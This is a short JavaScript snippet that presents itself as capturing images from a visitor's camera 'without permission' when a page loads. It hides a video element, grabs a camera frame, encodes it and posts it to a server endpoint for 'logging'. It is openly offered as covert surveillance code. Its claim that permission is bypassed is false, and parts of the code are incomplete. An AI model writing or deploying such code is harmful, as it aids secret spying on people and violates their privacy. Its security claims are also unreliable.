// Capture images from camera without permission
function captureImages() {
    // Create video element
    var video = document.createElement('video');
    video.setAttribute('autoplay', true);
    video.style.display = 'none';

    // Append video element to body
    document.body.appendChild(video);

    // Access camera stream without asking for permission
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(function(stream) {
            video.srcObject = stream;
            video.onloadedmetadata = function(e) {
                // Create canvas element
                var canvas = document.getElementById('canvas');
                var ctx = canvas.getContext('2d');

                // Draw video frame onto canvas
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Convert canvas content to base64 data URL
                var imageData = canvas.toDataURL('image/jpeg');

                // Send image data to server for logging
                sendImageDataToServer(imageData);

                // Remove video element from DOM
                video.parentNode.removeChild(video);
            };
        })
        .catch(function(err) {
            console.error('Error accessing camera:', err);
        });
}

// Send captured image data to server for logging
function sendImageDataToServer(imageData) {
    // Perform AJAX request to send image data to server
    // Example AJAX request using Fetch API:
    fetch('/log_images.php', {
        method: 'POST',
        body: JSON.stringify({ image: imageData }),
        headers: {
            'Content-Type': 'application/json'
        }
    })
    .then(function(response) {
        if (!response.ok) {
            console.error('Error logging image:', response.statusText);
        }
    })
    .catch(function(error) {
        console.error('Error logging image:', error);
    });
}

// Call function to capture images on page load
captureImages();
